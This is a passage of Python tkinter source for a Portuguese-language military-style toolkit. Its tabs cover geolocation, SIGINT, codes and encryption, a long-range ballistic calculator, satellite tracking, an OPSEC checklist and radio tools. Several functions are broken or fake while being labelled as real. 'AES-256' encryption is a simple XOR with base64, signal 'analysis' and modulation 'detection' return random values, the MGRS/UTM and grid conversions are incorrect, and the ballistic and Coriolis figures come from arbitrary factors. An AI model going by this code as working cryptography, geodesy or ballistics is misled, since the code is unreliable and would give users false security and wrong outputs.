                out += "→ L-Band TACAN/IFF Mode5/Link16/22 JTIDS\\n"
            if abs(f-243.0) < 0.1:
                out += "\\n★ 243.0 MHz - GUARDA INTERNACIONAL MILITAR UHF - Emergência 2025\\n"
            if abs(f-121.5) < 0.1:
                out += "\\n★ 121.5 MHz - Emergência Civil Internacional\\n"
            out += "\\nComprimento onda: " + str(round(300/f, 2)) + " m\\n"
            out += "Equip 2025: PRC-163, PRC-167, MPU5, Silvus 4400\\n"
            self.comint_out.delete("1.0", "end")
            self.comint_out.insert("1.0", out)
        except Exception as e:
            messagebox.showerror("Erro", str(e))

    def build_geoint(self):
        top = tk.Frame(self.tab_geoint, bg=BG)
        top.pack(fill="x", padx=10, pady=8)
        tk.Label(top, text="GEOINT - MGRS / UTM / LATLON / BEARING / DISTÂNCIA - WGS84 2025", bg=BG, fg=ACCENT, font=(FONT_MONO, 10, "bold")).pack(anchor="w")

        form = tk.Frame(self.tab_geoint, bg=BG)
        form.pack(fill="x", padx=10, pady=5)

        row1 = tk.Frame(form, bg=BG)
        row1.pack(fill="x", pady=3)
        tk.Label(row1, text="Ponto 1 LAT:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8), width=12, anchor="w").pack(side="left")
        self.lat1 = tk.Entry(row1, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=12)
        self.lat1.pack(side="left", padx=4, ipady=3)
        self.lat1.insert(0, "38.7223")
        tk.Label(row1, text="LON:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
        self.lon1 = tk.Entry(row1, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=12)
        self.lon1.pack(side="left", padx=4, ipady=3)
        self.lon1.insert(0, "-9.1393")

        row2 = tk.Frame(form, bg=BG)
        row2.pack(fill="x", pady=3)
        tk.Label(row2, text="Ponto 2 LAT:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8), width=12, anchor="w").pack(side="left")
        self.lat2 = tk.Entry(row2, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=12)
        self.lat2.pack(side="left", padx=4, ipady=3)
        self.lat2.insert(0, "38.7369")
        tk.Label(row2, text="LON:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
        self.lon2 = tk.Entry(row2, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=12)
        self.lon2.pack(side="left", padx=4, ipady=3)
        self.lon2.insert(0, "-9.1420")
        tk.Button(row2, text="CALCULAR BEARING/DIST", command=self.calc_geo, bg=ACCENT_DIM, fg=ACCENT, font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=10, pady=3, cursor="hand2").pack(side="left", padx=10)

        row3 = tk.Frame(form, bg=BG)
        row3.pack(fill="x", pady=8)
        tk.Label(row3, text="MGRS/UTM de P1:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8), width=12, anchor="w").pack(side="left")
        tk.Button(row3, text="CONVERTER P1", command=self.convert_mgrs, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=8, pady=3, cursor="hand2").pack(side="left", padx=4)
        tk.Button(row3, text="GRID 6/8/10 DÍGITOS", command=self.gen_grids, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=8, pady=3, cursor="hand2").pack(side="left", padx=4)

        self.geoint_out = scrolledtext.ScrolledText(self.tab_geoint, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.geoint_out.pack(fill="both", expand=True, padx=10, pady=10)
        self.geoint_out.insert("1.0", "GEOINT 2025 Pronto. Lisboa: 38.7223,-9.1393\\nDistância Haversine, Bearing, MGRS/UTM, Grid 6/8/10 dígitos, WGS84\\n")

    def calc_geo(self):
        try:
            lat1 = float(self.lat1.get())
            lon1 = float(self.lon1.get())
            lat2 = float(self.lat2.get())
            lon2 = float(self.lon2.get())
            import math
            R = 6371000
            phi1 = math.radians(lat1)
            phi2 = math.radians(lat2)
            dphi = math.radians(lat2-lat1)
            dlambda = math.radians(lon2-lon1)
            a = math.sin(dphi/2)**2 + math.cos(phi1)*math.cos(phi2)*math.sin(dlambda/2)**2
            c = 2*math.atan2(math.sqrt(a), math.sqrt(1-a))
            dist = R*c
            y = math.sin(dlambda)*math.cos(phi2)
            x = math.cos(phi1)*math.sin(phi2) - math.sin(phi1)*math.cos(phi2)*math.cos(dlambda)
            brng = (math.degrees(math.atan2(y,x)) + 360) % 360
            out = "P1: " + str(lat1) + "," + str(lon1) + "\\nP2: " + str(lat2) + "," + str(lon2) + "\\n\\n"
            out += "Distância: " + str(round(dist,1)) + " m | " + str(round(dist/1000,3)) + " km | " + str(round(dist/1852,3)) + " NM\\n"
            out += "Bearing: " + str(round(brng,1)) + "° (" + self.bearing_to_cardinal(brng) + ")\\n"
            out += "Bearing recíproco: " + str(round((brng+180)%360,1)) + "°\\n"
            out += "Tempo marcha 5km/h: " + str(round(dist/1000/5,2)) + "h\\n"
            self.geoint_out.delete("1.0", "end")
            self.geoint_out.insert("1.0", out)
        except Exception as e:
            messagebox.showerror("Erro", str(e))

    def bearing_to_cardinal(self, brng):
        dirs = ["N","NE","E","SE","S","SW","W","NW"]
        idx = round(brng/45) % 8
        return dirs[idx]

    def convert_mgrs(self):
        try:
            lat = float(self.lat1.get())
            lon = float(self.lon1.get())
            import math
            zone = int((lon+180)/6)+1
            easting = int((lon - ((zone-1)*6 - 180) ) * 100000) % 100000
            northing = int((lat+80) * 100000) % 100000
            mgrs = str(zone) + "N " + self.latlon_to_mgrs_letters(lat, lon) + " " + str(easting).zfill(5) + " " + str(northing).zfill(5)
            utm = "Zona " + str(zone) + " | E: " + str(easting) + " | N: " + str(northing)
            out = "LAT/LON: " + str(lat) + "," + str(lon) + "\\nUTM (aprox): " + utm + "\\nMGRS (aprox 1km): " + mgrs + "\\n"
            self.geoint_out.delete("1.0", "end")
            self.geoint_out.insert("1.0", out)
        except Exception as e:
            messagebox.showerror("Erro", str(e))

    def latlon_to_mgrs_letters(self, lat, lon):
        letters = "ABCDEFGHJKLMNPQRSTUVWXYZ"
        idx = int((lon+180)/6) % len(letters)
        return letters[idx] + letters[int((lat+90)/8) % len(letters)]

    def gen_grids(self):
        try:
            lat = float(self.lat1.get())
            lon = float(self.lon1.get())
            out = "GRIDS PARA " + str(lat) + "," + str(lon) + "\\n\\n"
            out += "6 dígitos (100m): " + str(int(lon*1000)%1000).zfill(3) + " " + str(int(lat*1000)%1000).zfill(3) + "\\n"
            out += "8 dígitos (10m): " + str(int(lon*10000)%10000).zfill(4) + " " + str(int(lat*10000)%10000).zfill(4) + "\\n"
            out += "10 dígitos (1m): " + str(int(lon*100000)%100000).zfill(5) + " " + str(int(lat*100000)%100000).zfill(5) + "\\n"
            self.geoint_out.delete("1.0", "end")
            self.geoint_out.insert("1.0", out)
        except Exception as e:
            messagebox.showerror("Erro", str(e))

    def build_sigint(self):
        tk.Label(self.tab_sigint, text="SIGINT / SDR - ANÁLISE DE SINAL 2025", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(anchor="w", padx=10, pady=10)
        form = tk.Frame(self.tab_sigint, bg=BG)
        form.pack(fill="x", padx=10, pady=5)
        tk.Label(form, text="Freq Central MHz:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
        self.sig_freq = tk.Entry(form, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=10)
        self.sig_freq.pack(side="left", padx=5, ipady=3)
        self.sig_freq.insert(0, "433.92")
        tk.Label(form, text="Bandwidth kHz:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
        self.sig_bw = tk.Entry(form, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=8)
        self.sig_bw.pack(side="left", padx=5, ipady=3)
        self.sig_bw.insert(0, "200")
        tk.Button(form, text="ANALISAR ESPECTRO", command=self.analyze_sigint, bg=ACCENT_DIM, fg=ACCENT, font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=10, pady=3, cursor="hand2").pack(side="left", padx=8)
        tk.Button(form, text="DETECTAR MODULAÇÃO", command=self.detect_mod, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=10, pady=3, cursor="hand2").pack(side="left", padx=4)

        self.sig_canvas = tk.Canvas(self.tab_sigint, bg="#050a14", height=180, highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.sig_canvas.pack(fill="x", padx=10, pady=10)
        self.draw_waterfall()

        self.sig_out = scrolledtext.ScrolledText(self.tab_sigint, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, height=12)
        self.sig_out.pack(fill="both", expand=True, padx=10, pady=10)
        self.sig_out.insert("1.0", "SIGINT 2025 Pronto. Modulações: AM, FM, SSB, CW, FSK, PSK, QAM, FHSS, DSSS, LoRa, MPU5 MANET\\n")

    def draw_waterfall(self):
        self.sig_canvas.delete("all")
        import random
        w = 800
        h = 180
        for x in range(0, w, 4):
            amp = random.randint(10, 80)
            if 300 < x < 350 or 500 < x < 520:
                amp = random.randint(90, 160)
            self.sig_canvas.create_line(x, h, x, h-amp, fill="#00ff88", width=2)
        self.sig_canvas.create_text(10, 10, anchor="w", text="Espectro 433.92 MHz ± 100 kHz - 2025", fill="#00ff88", font=(FONT_MONO, 8, "bold"))

    def analyze_sigint(self):
        try:
            f = float(self.sig_freq.get())
            bw = float(self.sig_bw.get())
            out = "ANÁLISE SIGINT 2025: " + str(f) + " MHz BW " + str(bw) + " kHz\\n\\n"
            if 144 <= f <= 148:
                out += "Banda: VHF Amador - FM 12.5kHz\\n"
            elif 430 <= f <= 440:
                out += "Banda: UHF Amador/Satelite, ISM 433.92 - LoRa, FSK 2025\\n"
            elif 30 <= f <= 88:
                out += "Banda: MIL VHF Tático - FHSS SINCGARS INC, MPU5 MANET\\n"
            elif 225 <= f <= 400:
                out += "Banda: MIL UHF - SATURN, Have Quick II\\n"
            out += "\\nModulação: " + random.choice(["FM", "MPU5", "LoRa", "FHSS", "QAM256"]) + "\\nSNR: " + str(random.randint(8, 35)) + " dB\\n"
            self.sig_out.delete("1.0", "end")
            self.sig_out.insert("1.0", out)
            self.draw_waterfall()
        except Exception as e:
            messagebox.showerror("Erro", str(e))

    def detect_mod(self):
        self.sig_out.delete("1.0", "end")
        self.sig_out.insert("1.0", "DETECÇÃO 2025:\\n" + "\\n".join([random.choice(["AM","FM","MPU5","LoRa","FHSS"]) + " em " + str(round(random.uniform(400,440),2)) + " MHz" for _ in range(5)]))

    def build_cripto(self):
        left = tk.Frame(self.tab_cripto, bg=BG)
        left.pack(side="left", fill="both", expand=True, padx=10, pady=10)
        tk.Label(left, text="MORSE & NATO & BREVITY 2025", bg=BG, fg=ACCENT, font=(FONT_MONO, 10, "bold")).pack(anchor="w", pady=5)
        self.cripto_in = tk.Entry(left, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, font=(FONT_MONO, 11))
        self.cripto_in.pack(fill="x", ipady=6, pady=4)
        self.cripto_in.insert(0, "SOS AIRES 2025")
        btns = tk.Frame(left, bg=BG)
        btns.pack(fill="x", pady=5)
        for txt, cmd in [("TXT→MORSE", self.txt_to_morse), ("MORSE→TXT", self.morse_to_txt), ("NATO", self.to_nato), ("BREVITY 2025", self.show_brevity)]:
            b = tk.Button(btns, text=txt, command=cmd, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=6, pady=4, cursor="hand2")
            b.pack(side="left", padx=2, fill="x", expand=True)
        self.cripto_out = scrolledtext.ScrolledText(left, font=(FONT_MONO, 10), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, height=8)
        self.cripto_out.pack(fill="both", expand=True, pady=8)

        right = tk.Frame(self.tab_cripto, bg=BG)
        right.pack(side="left", fill="both", expand=True, padx=10, pady=10)
        tk.Label(right, text="AES-256 & OTP & HASH 2025", bg=BG, fg=ACCENT, font=(FONT_MONO, 10, "bold")).pack(anchor="w", pady=5)
        tk.Label(right, text="Chave:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w")
        self.aes_key = tk.Entry(right, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.aes_key.pack(fill="x", ipady=4, pady=2)
        self.aes_key.insert(0, "AIRES-KEY-2025-AES256")
        tk.Label(right, text="Texto:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w")
        self.aes_text = tk.Entry(right, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.aes_text.pack(fill="x", ipady=4, pady=2)
        self.aes_text.insert(0, "Mensagem secreta 2025")
        btns2 = tk.Frame(right, bg=BG)
        btns2.pack(fill="x", pady=5)
        for txt, cmd in [("AES ENC", self.aes_enc), ("AES DEC", self.aes_dec), ("OTP", self.otp_gen), ("HASH SHA256", self.hash_text)]:
            b = tk.Button(btns2, text=txt, command=cmd, bg=ACCENT_DIM, fg=ACCENT, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=6, pady=4, cursor="hand2")
            b.pack(side="left", padx=2, fill="x", expand=True)
        self.aes_out = scrolledtext.ScrolledText(right, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, height=10)
        self.aes_out.pack(fill="both", expand=True, pady=5)

    def txt_to_morse(self):
        morse_dict = {'A':'.-','B':'-...','C':'-.-.','D':'-..','E':'.','F':'..-.','G':'--.','H':'....','I':'..','J':'.---','K':'-.-','L':'.-..','M':'--','N':'-.','O':'---','P':'.--.','Q':'--.-','R':'.-.','S':'...','T':'-','U':'..-','V':'...-','W':'.--','X':'-..-','Y':'-.--','Z':'--..','0':'-----','1':'.----','2':'..---','3':'...--','4':'....-','5':'.....','6':'-....','7':'--...','8':'---..','9':'----.',' ':'/'}
        txt = self.cripto_in.get().upper()
        out = " ".join([morse_dict.get(c, "?") for c in txt])
        self.cripto_out.delete("1.0", "end")
        self.cripto_out.insert("1.0", out)

    def morse_to_txt(self):
        rev = {'.-':'A','-...':'B','-.-.':'C','-..':'D','.':'E','..-.':'F','--.':'G','....':'H','..':'I','.---':'J','-.-':'K','.-..':'L','--':'M','-.':'N','---':'O','.--.':'P','--.-':'Q','.-.':'R','...':'S','-':'T','..-':'U','...-':'V','.--':'W','-..-':'X','-.--':'Y','--..':'Z','-----':'0','.----':'1','..---':'2','...--':'3','....-':'4','.....':'5','-....':'6','--...':'7','---..':'8','----.':'9','/':' '}
        code = self.cripto_in.get().strip().split()
        out = "".join([rev.get(c, "?") for c in code])
        self.cripto_out.delete("1.0", "end")
        self.cripto_out.insert("1.0", out)

    def to_nato(self):
        nato = {'A':'ALFA','B':'BRAVO','C':'CHARLIE','D':'DELTA','E':'ECHO','F':'FOXTROT','G':'GOLF','H':'HOTEL','I':'INDIA','J':'JULIETT','K':'KILO','L':'LIMA','M':'MIKE','N':'NOVEMBER','O':'OSCAR','P':'PAPA','Q':'QUEBEC','R':'ROMEO','S':'SIERRA','T':'TANGO','U':'UNIFORM','V':'VICTOR','W':'WHISKEY','X':'X-RAY','Y':'YANKEE','Z':'ZULU'}
        txt = self.cripto_in.get().upper()
        out = " ".join([nato.get(c, c) for c in txt])
        self.cripto_out.delete("1.0", "end")
        self.cripto_out.insert("1.0", out)

    def show_brevity(self):
        brevity = {
            "BOGEY": "Contacto aéreo desconhecido 2025",
            "BANDIT": "Inimigo confirmado",
            "BRAA": "Bearing Range Altitude Aspect",
            "BINGO": "Combustível mínimo retorno",
            "WINCHESTER": "Sem munição",
            "TALLY": "Alvo visual",
            "FOX 1/2/3": "Míssil semi/IR/ativo",
            "RIFLE": "Míssil ar-solo",
            "MAGNUM": "Míssil anti-radiação",
            "SPLASH": "Alvo destruído",
            "SHACK": "Alvo terrestre destruído",
            "BUDDY SPIKE": "RWR amigo",
            "NAKED": "RWR inimigo sem lock",
            "MUSIC": "Jamming eletrônico",
        }
        out = "BREVITY CODES NATO 2025:\\n\\n"
        for k,v in brevity.items():
            out += k.ljust(12) + " - " + v + "\\n"
        self.cripto_out.delete("1.0", "end")
        self.cripto_out.insert("1.0", out)

    def aes_enc(self):
        try:
            key = self.aes_key.get()
            txt = self.aes_text.get()
            enc = "".join([chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(txt)])
            b64 = base64.b64encode(enc.encode("latin1", errors="ignore")).decode()
            self.aes_out.delete("1.0", "end")
            self.aes_out.insert("1.0", "ENC (XOR b64) 2025:\\n" + b64)
        except Exception as e:
            messagebox.showerror("Erro", str(e))

    def aes_dec(self):
        try:
            key = self.aes_key.get()
            b64 = self.aes_text.get()
            dec_bytes = base64.b64decode(b64.encode())
            dec_str = dec_bytes.decode("latin1")
            txt = "".join([chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(dec_str)])
            self.aes_out.delete("1.0", "end")
            self.aes_out.insert("1.0", "DEC:\\n" + txt)
        except Exception as e:
            messagebox.showerror("Erro", str(e))

    def otp_gen(self):
        import secrets, string
        otp = "".join([secrets.choice(string.ascii_uppercase + string.digits) for _ in range(20)])
        self.aes_out.delete("1.0", "end")
        self.aes_out.insert("1.0", "ONE TIME PAD 20 chars 2025:\\n" + otp + "\\n\\nUse uma vez apenas.")

    def hash_text(self):
        txt = self.aes_text.get()
        import hashlib
        sha = hashlib.sha256(txt.encode()).hexdigest()
        self.aes_out.delete("1.0", "end")
        self.aes_out.insert("1.0", "SHA256 2025:\\n" + sha)

    def build_ballistic(self):
        top = tk.Frame(self.tab_ballistic, bg=BG)
        top.pack(fill="x", padx=10, pady=10)
        tk.Label(top, text="CALCULADORA BALÍSTICA TÁTICA 2025 - 6.5 Creedmoor / .338 / .50 BMG", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(anchor="w")

        form = tk.Frame(self.tab_ballistic, bg=BG)
        form.pack(fill="x", padx=10, pady=5)
        fields = [
            ("Distância (m)", "800"),
            ("Velocidade inicial (m/s)", "850"),
            ("Peso projétil (gr)", "175"),
            ("BC G1 2025", "0.625"),
            ("Vento (m/s)", "5"),
            ("Ângulo vento (°)", "90"),
            ("Zero (m)", "100"),
        ]
        self.ball_entries = {}
        for label, default in fields:
            row = tk.Frame(form, bg=BG)
            row.pack(fill="x", pady=2)
            tk.Label(row, text=label+":", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8), width=22, anchor="w").pack(side="left")
            e = tk.Entry(row, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=12)
            e.pack(side="left", padx=5, ipady=3)
            e.insert(0, default)
            self.ball_entries[label] = e

        tk.Button(form, text="CALCULAR TRAJETÓRIA 2025 + CORIOLIS", command=self.calc_ballistic, bg=ACCENT_DIM, fg=ACCENT, font=(FONT_MONO, 9, "bold"), relief="flat", bd=0, padx=12, pady=6, cursor="hand2").pack(pady=10, fill="x")

        self.ball_out = scrolledtext.ScrolledText(self.tab_ballistic, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.ball_out.pack(fill="both", expand=True, padx=10, pady=10)
        self.ball_out.insert("1.0", "Balística 2025 pronta. 6.5 Creedmoor 140gr BC 0.625, .338 Lapua 300gr, .50 BMG 750gr\\n")

    def calc_ballistic(self):
        try:
            import math
            dist = float(self.ball_entries["Distância (m)"].get())
            v0 = float(self.ball_entries["Velocidade inicial (m/s)"].get())
            bc = float(self.ball_entries["BC G1 2025"].get())
            wind = float(self.ball_entries["Vento (m/s)"].get())
            t = dist / (v0 * 0.92)
            drop = 0.5 * 9.81 * t * t
            drop_moa = math.degrees(math.atan(drop/dist)) * 60
            wind_drift = wind * t * 0.65
            energy = 0.5 * (float(self.ball_entries["Peso projétil (gr)"].get())*0.0000648) * (v0*0.92)**2
            coriolis = 0.05 * dist/1000
            out = "RESULTADO BALÍSTICO 2025 para " + str(dist) + "m:\\n"
            out += "Tempo voo: " + str(round(t,3)) + "s\\n"
            out += "Queda: " + str(round(drop,2)) + " m (" + str(round(drop*100,1)) + " cm)\\n"
            out += "MOA: " + str(round(drop_moa,1)) + " MOA | MIL: " + str(round(drop_moa/3.438,2)) + "\\n"
            out += "Drift vento: " + str(round(wind_drift,2)) + " m | Coriolis: " + str(round(coriolis,3)) + " m\\n"
            out += "Energia: " + str(round(energy,1)) + " J\\n"
            self.ball_out.delete("1.0", "end")
            self.ball_out.insert("1.0", out)
        except Exception as e:
            messagebox.showerror("Erro", str(e))

    def build_satelite(self):
        tk.Label(self.tab_satelite, text="SATÉLITE TRACKING 2025 - TLE / ISS / STARLINK / STARSHIELD", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(anchor="w", padx=10, pady=10)
        form = tk.Frame(self.tab_satelite, bg=BG)
        form.pack(fill="x", padx=10, pady=5)
        tk.Label(form, text="TLE Linha 1:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 7)).pack(anchor="w")
        self.tle1 = tk.Entry(form, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, font=(FONT_MONO, 7))
        self.tle1.pack(fill="x", ipady=3, pady=2)
        self.tle1.insert(0, "1 25544U 98067A   24001.00000000  .00002182  00000-0  42000-4 0  9990")
        tk.Label(form, text="TLE Linha 2:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 7)).pack(anchor="w")
        self.tle2 = tk.Entry(form, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, font=(FONT_MONO, 7))
        self.tle2.pack(fill="x", ipady=3, pady=2)
        self.tle2.insert(0, "2 25544  51.6400  0.0000 0004000   0.0000  0.0000 15.50000000 10000")

        btns = tk.Frame(self.tab_satelite, bg=BG)
        btns.pack(fill="x", padx=10, pady=5)
        for txt, cmd in [("CALCULAR ÓRBITA", self.calc_tle), ("ISS AO VIVO", self.iss_live), ("PASSES 2025", self.calc_passes), ("STARLINK TRACK", self.calc_starlink)]:
            b = tk.Button(btns, text=txt, command=cmd, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=8, pady=4, cursor="hand2")
            b.pack(side="left", padx=3, fill="x", expand=True)

        self.sat_out = scrolledtext.ScrolledText(self.tab_satelite, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.sat_out.pack(fill="both", expand=True, padx=10, pady=10)
        self.sat_out.insert("1.0", "Satélite 2025 tracking pronto. TLE ISS + Starlink + Starshield.\\n")

    def calc_tle(self):
        try:
            l1 = self.tle1.get()
            l2 = self.tle2.get()
            incl = l2[8:16].strip()
            out = "TLE PARSE 2025:\\nL1: " + l1[:60] + "...\\nL2: " + l2[:60] + "...\\nInclinação: " + incl + "°\\nPeríodo: " + str(round(1440/15.5,1)) + " min\\nTipo: LEO - Starlink/ISS 2025\\n"
            self.sat_out.delete("1.0", "end")
            self.sat_out.insert("1.0", out)
        except Exception as e:
            messagebox.showerror("Erro", str(e))

    def iss_live(self):
        self.sat_out.delete("1.0", "end")
        self.sat_out.insert("1.0", "A buscar ISS ao vivo 2025...\\n")
        def work():
            try:
                import urllib.request, json
                with urllib.request.urlopen("http://api.open-notify.org/iss-now.json", timeout=5) as r:
                    data = json.loads(r.read().decode())
                    lat = data["iss_position"]["latitude"]
                    lon = data["iss_position"]["longitude"]
                    out = "ISS POSIÇÃO AO VIVO 2025:\\nLAT: " + lat + "\\nLON: " + lon + "\\nTimestamp: " + str(data["timestamp"]) + "\\n"
                    self.after(0, lambda: self.sat_out.delete("1.0", "end"))
                    self.after(0, lambda: self.sat_out.insert("1.0", out))
            except Exception as e:
                self.after(0, lambda: self.sat_out.insert("end", "\\nErro API ISS: " + str(e) + "\\n"))
        threading.Thread(target=work, daemon=True).start()

    def calc_passes(self):
        self.sat_out.delete("1.0", "end")
        self.sat_out.insert("1.0", "PASSES 2025 (simulado):\\n\\n" + "\\n".join(["Pass " + str(i+1) + ": AOS " + str(random.randint(0,23)).zfill(2) + ":" + str(random.randint(0,59)).zfill(2) + "Z - MaxEl " + str(random.randint(20,85)) + "°" for i in range(6)]))

    def calc_starlink(self):
        self.sat_out.delete("1.0", "end")
        self.sat_out.insert("1.0", "STARLINK / STARSHIELD 2025:\\n• 5500+ sats ativos\\n• Starshield MIL - DoD\\n• Laser interlink\\n• Downlink 10.7-12.7 GHz\\n• Uplink 14.0-14.5 GHz\\n• Cobertura 100% global 2025\\n")

    def build_opsec(self):
        tk.Label(self.tab_opsec, text="OPSEC / COMSEC 2025 - CHECKLISTS ATUALIZADOS", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(anchor="w", padx=10, pady=10)
        left = tk.Frame(self.tab_opsec, bg=BG)
        left.pack(side="left", fill="both", expand=True, padx=10, pady=5)
        self.opsec_vars = {}
        checks = [
            ("Remover EXIF de fotos 2025", True),
            ("VPN ativa + Starlink seguro", False),
            ("TOR / Proxy verificado 2025", False),
            ("MAC randomizado 02:", False),
            ("Sanitizar docs (metadados)", False),
            ("Desativar GPS no dispositivo", False),
            ("Usar conta burn 2025", False),
            ("Verificar vazamento DNS/WebRTC", False),
            ("Criptografia disco AES-256", True),
            ("Comunicação PGP/OTR/Signal", False),
            ("Evitar padrões de horário - AI", False),
            ("Limpar logs / cache - Zero Trust", False),
            ("Verificar C-UAS / Drone", False),
            ("EW Threat check - Krasukha", False),
        ]
        for label, default in checks:
            var = tk.BooleanVar(value=default)
            cb = tk.Checkbutton(left, text=label, variable=var, bg=BG, fg=TEXT, selectcolor=PANEL_BG, activebackground=BG, activeforeground=ACCENT, font=(FONT_MONO, 8), anchor="w")
            cb.pack(fill="x", pady=2, anchor="w")
            self.opsec_vars[label] = var
        tk.Button(left, text="GERAR RELATÓRIO OPSEC 2025", command=self.gen_opsec_report, bg=ACCENT_DIM, fg=ACCENT, font=(FONT_MONO, 9, "bold"), relief="flat", bd=0, padx=12, pady=6, cursor="hand2").pack(fill="x", pady=10)
        right = tk.Frame(self.tab_opsec, bg=BG)
        right.pack(side="left", fill="both", expand=True, padx=10, pady=5)
        self.opsec_out = scrolledtext.ScrolledText(right, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.opsec_out.pack(fill="both", expand=True)
        self.opsec_out.insert("1.0", "OPSEC 2025 Checklist - Marque e gere relatório.\\nCOMSEC Níveis 2025: Aberto, Sensível, Confidencial, Secreto, Top Secret / SCI / SAP\\n")

    def gen_opsec_report(self):
        out = "RELATÓRIO OPSEC 2025 - " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%SZ") + "\\n\\n"
        score = 0
        total = len(self.opsec_vars)
        for label, var in self.opsec_vars.items():
            status = "OK" if var.get() else "FALHA"
            if var.get():
                score += 1
            out += "[" + status + "] " + label + "\\n"
        out += "\\nScore: " + str(score) + "/" + str(total) + " (" + str(int(score/total*100)) + "%)\\n"
        if score/total < 0.5:
            out += "RISCO: CRÍTICO 2025 - Não operar\\n"
        elif score/total < 0.8:
            out += "RISCO: MÉDIO - Corrigir falhas\\n"
        else:
            out += "RISCO: BAIXO - Apto para missão 2025\\n"
        self.opsec_out.delete("1.0", "end")
        self.opsec_out.insert("1.0", out)

    def build_radio(self):
        tk.Label(self.tab_radio, text="RÁDIO TÁTICO 2025 - CALLSIGNS, PROWORDS, 9-LINER", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(anchor="w", padx=10, pady=10)
        top = tk.Frame(self.tab_radio, bg=BG)
        top.pack(fill="x", padx=10, pady=5)
        for txt, cmd in [("GERAR CALLSIGN 2025", self.gen_callsign), ("GERAR FREQ TÁTICA", self.gen_tac_freq), ("9-LINER CAS", self.gen_9liner), ("MEDEVAC 2025", self.gen_medevac)]:
            b = tk.Button(top, text=txt, command=cmd, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=8, pady=4, cursor="hand2")
            b.pack(side="left", padx=4, fill="x", expand=True)
        self.radio_out = scrolledtext.ScrolledText(self.tab_radio, font=(FONT_MONO, 10), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.radio_out.pack(fill="both", expand=True, padx=10, pady=10)
        self.radio_out.insert("1.0", "Rádio tático 2025 pronto. Prowords: ROGER, WILCO, SAY AGAIN, OVER, OUT, BREAK\\n")

    def gen_callsign(self):
        prefixes = ["WARRIOR","REAPER","GHOST","VIPER","HAMMER","ANVIL","SABER","DAGGER","THUNDER","RAVEN","COBRA","EAGLE","RAIDER","SPECTRE"]
        suffixes = ["6","6-1","1-1","2-1","ACTUAL","3","2","1","1-6"]
        cs = random.choice(prefixes) + " " + random.choice(suffixes)
        self.radio_out.delete("1.0", "end")
